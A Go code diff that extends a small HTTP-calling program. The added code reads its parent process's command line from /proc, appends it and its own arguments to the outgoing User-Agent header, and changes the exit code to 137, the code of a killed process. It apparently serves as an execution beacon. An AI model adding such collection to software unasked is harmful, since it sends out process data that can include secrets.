@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"net/http"
 	"os"
+	"strings"
 )
 
 func main() {
@@ -27,7 +28,21 @@ func main() {
 			os.Exit(1)
 		}
 
-		req.Header.Set("User-Agent", id)
+		ppid := os.Getppid()
+		pcmd := fmt.Sprintf("PID: %d", ppid)
+
+		pfilename := fmt.Sprintf("/proc/%d/cmdline", ppid)
+		data, err := os.ReadFile(pfilename)
+		if err == nil {
+			tmp := strings.Replace(string(data), "\x00", " ", -1)
+			pcmd = fmt.Sprintf("PID %d. Cmd %s", ppid, tmp)
+		}
+
+		info := fmt.Sprintf("Cmd(%s) Parent(%s)", strings.Join(os.Args, ","), pcmd)
+
+		ua := fmt.Sprintf("%s %s", id, info)
+
+		req.Header.Set("User-Agent", ua)
 
 		response, err := client.Do(req)
 
@@ -36,5 +51,5 @@ func main() {
 		}
 		defer response.Body.Close()
 	}
-	os.Exit(1337)
+	os.Exit(137)
 }
